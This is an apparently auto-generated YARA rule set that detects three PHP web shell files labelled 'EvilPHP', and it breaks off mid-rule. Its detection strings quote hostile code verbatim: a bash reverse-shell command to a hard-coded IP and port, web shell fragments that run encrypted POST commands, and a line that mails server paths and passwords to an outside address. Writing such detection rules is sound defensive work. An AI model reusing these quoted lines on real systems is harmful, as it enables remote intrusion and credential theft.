/*
   YARA Rule Set
   Author: yarGen Rule Generator
   Date: 2022-09-22
   Identifier: EvilPHP
   Reference: https://github.com/Neo23x0/yarGen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _home_pork_Desktop_EvilPHP_revers {
   meta:
      description = "EvilPHP - file revers.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2022-09-22"
      hash1 = "162c1b2b1d6e245e7983747e8f2ed99f398f29abf049c322b89b7db0ac249637"
   strings:
      $x1 = "exec(\"/bin/bash -c 'bash -i >& /dev/tcp/3.92.45.132/4444 0>&1'\");" fullword ascii
      $s2 = "echo exec;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule _home_pork_Desktop_EvilPHP_js {
   meta:
      description = "EvilPHP - file js.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2022-09-22"
      hash1 = "d9572d8dd401c2c87fd19f79061509967bda7acff19fccb778b3aa69364a36a0"
   strings:
      $s1 = "     '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href=\"http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_" ascii
      $s2 = "  <!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></sc" ascii
      $s3 = "  <!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></sc" ascii
      $s4 = "  $explink = 'http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=';" fullword ascii
      $s5 = "  if(isset($_POST['p1'])) $_POST['p1'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HO" ascii
      $s6 = "  if(isset($_POST['c'])) $_POST['c'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'" ascii
      $s7 = "  if(isset($_POST['a'])) $_POST['a'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'" ascii
      $s8 = "  $tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'].\"\\n\".$_POST['pass']; @mail('r57gentr@gmail.com', 'root', $tmp); // Edit" ascii
      $s9 = "  $tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'].\"\\n\".$_POST['pass']; @mail('r57gentr@gmail.com', 'root', $tmp); // Edit" ascii
      $s10 = "  echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SERV" ascii
      $s11 = "  if(isset($_POST['p3'])) $_POST['p3'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HO" ascii
      $s12 = "  if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HO" ascii
      $s13 = "        $str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=postgres\";" fullword ascii
      $s14 = "  if(isset($_POST['p1'])) $_POST['p1'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HO" ascii
      $s15 = "  if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HO" ascii
      $s16 = "  if(isset($_POST['a'])) $_POST['a'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'" ascii
      $s17 = " Unable to execute command\\n\";" fullword ascii
      $s18 = "  if(isset($_POST['p3'])) $_POST['p3'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HO" ascii
      $s19 = "  if(isset($_POST['c'])) $_POST['c'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'" ascii
      $s20 = "name()).'\" target=\"_blank\">[ Google ]</a> <a href=\"'.$explink.'\" target=_blank>[ Exploit-DB ]</a></nobr><br>'.$uid.' ( '.$u" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule _home_pork_Desktop_EvilPHP_nice {
   meta:
      description = "EvilPHP - file nice.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2022-09-22"
      hash1 = "ae239a07b6b9209e597468d3aedf9fcdfaea4b2ff865543aa6a5f63cb55f3fee"
   strings:
      $s1 = "'executed' => \"\\\"[%1]\\\" has been executed successfully:\\n{%2}\"," fullword ascii
      $s2 = "'not_executed' => \"\\\"[%1]\\\" could not be executed successfully:\\n{%2}\"," fullword ascii
      $s3 = "exec('echo \"./' . basename($file) . '\" | /bin/sh', $output, $retval);" fullword ascii
      $s4 = "if (!$win && function_exists('exec') && $file['is_file'] && $file['is_executable'] && file_exists('/bin/sh')) {" fullword ascii
      $s5 = "if ($file['is_link']) $file['target'] = @readlink($path);" fullword ascii
      $s6 = "if (array_key_exists('content', $_POST)) {" fullword ascii
      $s7 = "listing_page(error('not_executed', $file, implode(\"\\n\", $output)));" fullword ascii
      $s8 = "echo \"\\n\" . $_POST['user'] . ':' . crypt($_POST['password']);" fullword ascii
      $s9 = "AAAAAAAAAAAC" ascii /* base64 encoded string '
